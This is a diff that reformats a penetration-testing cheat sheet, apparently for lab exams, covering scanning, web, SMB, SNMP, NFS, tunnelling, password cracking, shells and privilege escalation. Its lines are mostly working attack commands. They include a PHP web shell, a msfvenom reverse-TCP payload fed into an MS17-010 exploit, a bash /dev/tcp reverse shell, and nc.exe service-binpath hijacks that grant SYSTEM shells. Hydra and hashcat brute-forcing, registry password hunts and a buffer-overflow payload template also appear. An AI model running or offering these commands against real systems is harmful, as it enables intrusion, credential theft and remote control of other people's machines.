@@ -16,43 +16,52 @@ masscan -p22,80,445 10.1.1.0/24
 # Port Knocking
 for x in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done
 
-Web
 
 # Gobuster 3
 python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.173 -e sh,txt,php,html,htm,zip,tar.gz,tar --plain-text-report=dirsearch_europa_http_quick -t 25
+
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -x html,php -t 20
+
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php -k
 
 curl -v http://10.10.10.10/robots.txt
+
 curl -k -v https://10.10.10.10/robots.txt
+
 curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
 
 curl -v -X OPTIONS http://10.10.10.10/test
+
 davtest -url http://10.10.10.10/test
 
 nikto -h http://10.10.10.10
+
 uniscan -u http://10.10.10.10 -qweds
 
 # TLS
 
 nmap -sV -p 443 --script=ssl-heartbleed 10.10.10.10
+
 sslyze --regular 10.10.10.10
+
 sslscan https://10.10.10.10
 
 # Shellshock
 
 nmap -sV -p- --script http-shellshock 10.10.10.10
+
 nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 10.10.10.10
 
 # WordPress
 wpscan --url http://10.10.10.10 --enumerate u
 
 # Drupal
-# https://github.com/droope/droopescan
+
+https://github.com/droope/droopescan
 droopescan scan drupal -u http://10.10.10.10
 
 # Joomla
-# https://github.com/rezasp/joomscan
+ https://github.com/rezasp/joomscan
 joomscan --url http://10.10.10.10
 
 # sqlmap crawl  
@@ -83,7 +92,8 @@ union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
 
 # Alternative
 <?php echo shell_exec($_GET["cmd"]);?>
-SMB
+
+# SMB
 nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
 
 nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
@@ -95,19 +105,24 @@ enum4linux -av 10.10.10.10
 rpcclient -U "" 10.10.10.10
 
 smbclient //10.10.10.10/share
+
 apt-get install -y cifs-utils
+
 mount -t cifs 10.10.10.10:/share1 /test
 
 # Manual MS17-010 exploitation
-# https://github.com/worawit/MS17-010
+#https://github.com/worawit/MS17-010
+
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1337 -f exe > blue.exe
 
 # Before
 #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+
 #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 
 # After
 smb_send_file(smbConn, 'blue.exe', 'C', '/blue.exe')
+
 service_exec(conn, r'cmd /c c:\\blue.exe')
 
 # smbver.sh
@@ -119,56 +134,74 @@ echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
 echo "" && sleep .1
 
 nmap --script=samba-vuln-cve-2012-1182  -p 139 10.10.10.10
-SNMP
+
+# SNMP
+
 snmp-check 10.10.10.10
 
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings_onesixtyone.txt 10.10.10.10 public
 
 snmpwalk -v1 -c public 10.10.10.10
-NFS
+
+# NFS
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10
 
 mount -t nfs 10.10.10.10:/var/nfs /mnt/nfs
 
 # Resources 
-# https://github.com/bonsaiviking/NfSpy
-SSH Tunneling
-# https://github.com/sshuttle/sshuttle
+#https://github.com/bonsaiviking/NfSpy
+
+# SSH Tunneling
+ https://github.com/sshuttle/sshuttle
+
 sshuttle -vvr user@10.10.10.10 10.1.1.0/24
 
 # Local port forwarding
+
 ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
 
 # Remote port forwarding
+
 ssh <gateway> -R <remote port to bind>:<local host>:<local port>
 
 # Dynamic port forwarding
+
 ssh -D <local proxy port> -p <remote port> <target>
 
 # Plink local port forwarding
 plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
-Brute Force
-# /etc/shadow
+
+# Brute Force
+#/etc/shadow
+
 unshadow passwd shadow > unshadow.db
+
 john unshadow.db --wordlist=/usr/share/wordlists/rockyou.txt
 
 # SAM
+
 samdump2 SYSTEM SAM > winhashes.txt
+
 john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt winhashes.txt
 
 # Hashcat SHA512 $6$ shadow file  
+
 hashcat -m 1800 -a 0 hash.txt rockyou.txt --username
 
 # Hashcat MD5 $1$ shadow file  
+
 hashcat -m 500 -a 0 hash.txt rockyou.txt --username
 
 # Hashcat MD5 Apache webdav file  
+
+
 hashcat -m 1600 -a 0 hash.txt rockyou.txt
 
 # Hashcat SHA1  
 hashcat -m 100 -a 0 hash.txt rockyou.txt --force
 
 # Hashcat WordPress  
+
 hashcat -m 400 -a 0 --remove hash.txt rockyou.txt
 
 hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/portal/xlogin/:user=^USER^&pass=^PASS^:invalid login"
@@ -176,12 +209,17 @@ hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form
 hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "/portal/xlogin/:user=^USER^&pass=^PASS^:S=302"
 
 # SSH
+
 hydra -l username -P /usr/share/wordlists/fasttrack.txt ssh://10.10.10.10
 # FTP
+
 hydra -l username -P /usr/share/wordlists/fasttrack.txt ftp://10.10.10.10
 # RDP
+
 hydra -l username -P /usr/share/wordlists/fasttrack.txt rdp://10.10.10.10
-Payload/Shell
+
+# Payload/Shell
+
 # Bash
 bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
 
@@ -299,12 +337,16 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB
 
 # AlwaysInstallElevated fun
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 
 # Other commands to run to hopefully get what we need
 dir /s *pass* == *cred* == *vnc* == *.config*
+
 findstr /si password *.xml *.ini *.txt
+
 reg query HKLM /f password /t REG_SZ /s
+
 reg query HKCU /f password /t REG_SZ /s
 
 # Service permissions
@@ -312,36 +354,53 @@ sc query
 sc qc [service_name]
 
 # Accesschk stuff
-# https://github.com/ankh2054/windows-pentest/tree/master/Privelege
+ https://github.com/ankh2054/windows-pentest/tree/master/Privelege
 # accesschk seems to get stuck on certain machines without /accepteula
 accesschk.exe /accepteula 
+
 accesschk.exe /accepteula -ucqv [service_name] 
+
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * 
+
 accesschk.exe /accepteula -ucqv [service_name]
 
 # Find all weak folder permissions per drive.
+
 accesschk.exe /accepteula -uwdqs Users c:\
+
 accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
 
 # Find all weak file permissions per drive.
+
 accesschk.exe /accepteula -uwqs Users c:\*.*
+
 accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
 
 # Binary planting
 sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
+
 sc config [service_name] obj= ".\LocalSystem" password= ""
+
 sc qc [service_name] (to verify!)
+
 net start [service_name]
 
 # Search for passwords
+
 dir /s *pass* == *cred* == *vnc* == *.config*
+
 findstr /si password *.xml *.ini *.txt
+
 reg query HKLM /f password /t REG_SZ /s
+
 reg query HKCU /f password /t REG_SZ /s
 
 sc qc upnphost
+
 sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.10.10.10 1234 -e C:\WINDOWS\System32\cmd.exe"
+
 sc config upnphost obj= ".\LocalSystem" password= ""
+
 sc qc upnphost
 
 # If it fails because of a missing dependency, run the following:
@@ -377,19 +436,22 @@ Response.write(o)
 %>
 
 # Resources
-# https://www.fuzzysecurity.com/tutorials/16.html
-# https://guif.re/windowseop
-# https://github.com/FuzzySecurity/PowerShell-Suite
-# https://github.com/samratashok/nishang
-# https://github.com/411Hall/JAWS
-# https://github.com/PowerShellMafia/PowerSploit
-# https://github.com/rasta-mouse/Sherlock
-# https://github.com/ohpe/juicy-potato
-Linux Privilege Escalation
+https://www.fuzzysecurity.com/tutorials/16.html
+https://guif.re/windowseop
+https://github.com/FuzzySecurity/PowerShell-Suite
+https://github.com/samratashok/nishang
+https://github.com/411Hall/JAWS
+https://github.com/PowerShellMafia/PowerSploit
+https://github.com/rasta-mouse/Sherlock
+https://github.com/ohpe/juicy-potato
+
+# Linux Privilege Escalation
+
 # Enter while in reverse shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-# Ctrl-Z
+Ctrl-Z
+
 # In Kali
 stty raw -echo && fg
 
@@ -414,16 +476,18 @@ su - user
 id
 
 # Resources
-# https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-# https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
-# https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
-# https://guif.re/linuxeop
-# https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/
-# https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
-# https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
-# https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
-# https://gtfobins.github.io/
-Buffer Overflow
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+https://guif.re/linuxeop
+https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
+https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+https://gtfobins.github.io/
+
+
+# Buffer Overflow
 # Payload
 payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
 
